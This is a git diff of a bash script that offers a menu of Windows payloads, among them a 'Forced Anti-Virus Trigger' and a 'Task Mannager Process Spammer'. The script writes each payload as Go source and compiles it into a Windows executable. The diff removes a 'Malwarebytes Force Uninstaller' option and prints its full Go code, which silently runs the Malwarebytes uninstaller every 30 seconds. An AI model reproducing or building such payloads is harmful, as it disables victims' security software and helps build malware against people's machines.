@@ -58,7 +58,6 @@ echo "Select payload:"
 echo ""
 echo "1) Forced Anti-Virus Trigger"
 echo "2) Task Mannager Process Spammer"
-echo "3) Malwarebytes Force Uninstaller"
 #ENTER THE REST OF THEM
 echo ""
 #ui logic
@@ -128,9 +127,6 @@ EOF
 #del org file
 	  rm $PWD/output.go
         break
-#del org file
-	  rm $PWD/output.go
-        break
       else
 	echo "That's not an option!"
 	echo ""
@@ -180,66 +176,6 @@ EOF
 #del org file
 	  rm $PWD/output.go
         break
-#del org file
-	  rm $PWD/output.go
-        break
-      else
-	echo "That's not an option!"
-	echo ""
-        echo "Enter prefered operating system - 1) Windows"
-        echo ""
-        continue
-      fi
-    done
-    break
-  elif [ "$payload" = "3" ]; then
-  echo ""
-  echo ""
-#check opsystm
-  echo "Enter prefered operating system - 1) Windows"
-  echo ""
-#check opsystm logic
-    while true; do
-      read opsys
-      if [ "$opsys" = "1" ]; then
-	if [ -e "output.go" ]; then
-	  echo "File output.go already exists!"
-	else
-#TMPS - wind
-	  echo "" > output.go
-	  cat > output.go <<EOF
-package main
-
-import (
-	"os/exec"
-	"time"
-	"os"
-)
-
-func main() {
-	for {
-		time.Sleep(30 * time.Second)		
-		
-		mal := exec.Command("cmd", "/C", "C:\\Program Files\\Malwarebytes\\Anti-Malware\\unins000.exe", "/verysilent", "/suppressmsgboxes", "/norestart")
-
-		if _, err := os.Stat("C:\\Program Files\\Malwarebytes\\Anti-Malware\\"); err == nil {
- 			mal.Run()
-		}
-		
-
-	}
-}
-EOF
-	  echo "File saved to" $PWD
-#compile to exe
-	  env GOOS=windows GOARCH=amd64 go build $PWD/output.go
-	fi
-#del org file
-	  rm $PWD/output.go
-        break
-#del org file
-	  rm $PWD/output.go
-        break
       else
 	echo "That's not an option!"
 	echo ""
@@ -258,7 +194,6 @@ EOF
   echo ""
   echo "1) Forced Anti-Virus Trigger"
   echo "2) Task Mannager Process Spammer"
-  echo "3) Malwarebytes Force Uninstaller"
   continue
   fi
 done
